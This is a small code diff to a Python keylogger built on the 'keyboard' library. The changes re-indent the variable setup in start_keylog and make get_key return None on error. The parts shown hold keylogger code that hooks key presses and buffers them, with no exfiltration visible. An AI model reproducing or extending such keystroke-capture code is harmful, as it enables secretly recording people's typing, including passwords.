@@ -1,8 +1,8 @@
 import keyboard
 def start_keylog():
-    global keys, hook_status
-    keys = []
-    hook_status = False
+        global keys, hook_status
+        keys = []
+        hook_status = False
 
 def on_press(event):
         if event.event_type == "down":
@@ -34,4 +34,4 @@ def get_key():
         keys.clear()
         return data
     except:
-        return ''
+        return None
